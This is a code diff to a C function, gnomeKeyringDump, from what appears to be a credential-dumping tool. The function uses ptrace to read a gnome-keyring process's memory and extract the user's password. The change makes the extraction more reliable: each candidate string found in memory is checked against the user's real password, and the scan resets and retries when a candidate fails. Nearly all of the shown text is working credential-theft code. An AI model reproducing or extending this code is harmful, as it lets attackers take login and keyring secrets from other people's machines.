@@ -79,9 +79,9 @@ int gnomeKeyringDump(int pid)
     unsigned long *egg;
     unsigned long marker = 0;
     unsigned long base = 0;
-    int status = -1, loopNum=0;
-    int passwdDone = 0;
-    int cur = 0;
+    int status = -1, loopNum=0, secretsChecked=0;
+    int passwdDone = 0, passwdCur = 0;
+    int eggCur = 0, passGood = 0;
     char *sysVersion = NULL;
     void *eggPtr = NULL;
 
@@ -154,26 +154,46 @@ int gnomeKeyringDump(int pid)
         loopNum = 0;
         while (!passwdDone)
         {
-            if (loopNum == ((MAX_PASSWD-1) / sizeof(long)) )
+            if ( (loopNum == ((MAX_PASSWD-1) / sizeof(long))) || (secretsChecked == 10) )
             {
                 printf("  [!] ERROR: Cannot find password\n");
                 return 1;
             }
             chunk = 0;
-            eggAddr += cur;
+            eggAddr += eggCur;
   
             if ( (chunk = ptrace(PTRACE_PEEKDATA, pid, (void*)eggAddr, NULL)) < 0)
             {
                 printf("  [!] ERROR: Ptrace peek 2 failed - %s\n", strerror(errno));
                 return -1;
             }
-            memcpy(passwd+cur, &chunk, sizeof(long));
-            for (int i=0; i < cur; i++)
+
+            memcpy(passwd+passwdCur, &chunk, sizeof(long));
+
+            for (int i=0; i < passwdCur; i++)
             {
-                if (passwd[i] == '\0')
-                    passwdDone = 1;
+                if (passwd[i] == '\0') // End of secret string reached
+                {
+                    if ( (passGood = checkPasswd(user, passwd)) < 0 )
+                    {
+                        printf("  [!] ERROR: Could not check passwd\n");
+                        return -1;
+                    }
+                    if ( passGood == 1)
+                    {
+                        passwdDone = 1;
+                    } else
+                    {
+                        memset(passwd, 0, MAX_PASSWD);
+                        passwdCur = 0; // reset passwd string cursor
+                        loopNum = -1; // reset loops for this egg secret
+                        secretsChecked += 1; // inc timeout counter
+                        break;
+                    }
+                }
             }
-            cur += sizeof(long);
+            eggCur += sizeof(long);
+            passwdCur += sizeof(long);
             loopNum += 1;
         }
         if ( ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0 )
